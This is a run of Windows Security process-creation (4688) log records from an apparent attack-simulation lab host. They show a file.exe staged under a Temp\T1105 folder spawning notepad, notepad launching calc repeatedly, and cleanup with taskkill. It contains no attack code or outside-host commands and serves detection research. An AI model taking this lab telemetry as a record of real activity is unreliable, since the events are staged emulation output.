02/16/2022 08:58:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52746897
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x16f0
	New Process Name:	C:\Windows\System32\taskkill.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	Taskkill  /IM Calculator.exe /F

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:58:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52746864
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-HOST-MHAAG-$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		WIN-HOST-MHAAG-$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x88c
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x2c8
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:58:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52746853
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x6dc
	New Process Name:	C:\Windows\System32\taskkill.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	Taskkill  /IM notepad.exe /F

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744400
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f74
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1f1c
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744373
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1694
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x142c
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744372
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x136c
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x4e4
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744371
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x19e4
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xac0
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744370
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc9c
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x9b0
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744369
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x121c
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xa40
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744368
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d94
	New Process Name:	C:\Windows\System32\win32calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1a28
	Creator Process Name:	C:\Windows\System32\calc.exe
	Process Command Line:	"C:\Windows\System32\win32calc.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744196
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-HOST-MHAAG-$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2a0
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x258
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\Windows\system32\svchost.exe -k wsappx

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744192
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x4e4
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1780
	Creator Process Name:	C:\Windows\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744186
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x117c
	New Process Name:	C:\Windows\System32\timeout.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	timeout  /T 10

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744177
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x142c
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1780
	Creator Process Name:	C:\Windows\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744176
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x9b0
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xed0
	Creator Process Name:	C:\Windows\System32\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744166
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a28
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xed0
	Creator Process Name:	C:\Windows\System32\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744165
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1780
	New Process Name:	C:\Windows\notepad.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1f84
	Creator Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
	Process Command Line:	"C:\Windows\notepad.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744159
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa40
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xed0
	Creator Process Name:	C:\Windows\System32\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744158
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f1c
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xed0
	Creator Process Name:	C:\Windows\System32\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744157
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xac0
	New Process Name:	C:\Windows\System32\calc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0xed0
	Creator Process Name:	C:\Windows\System32\notepad.exe
	Process Command Line:	calc

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744156
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xed0
	New Process Name:	C:\Windows\System32\notepad.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1f84
	Creator Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
	Process Command Line:	"C:\Windows\System32\notepad.exe" 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

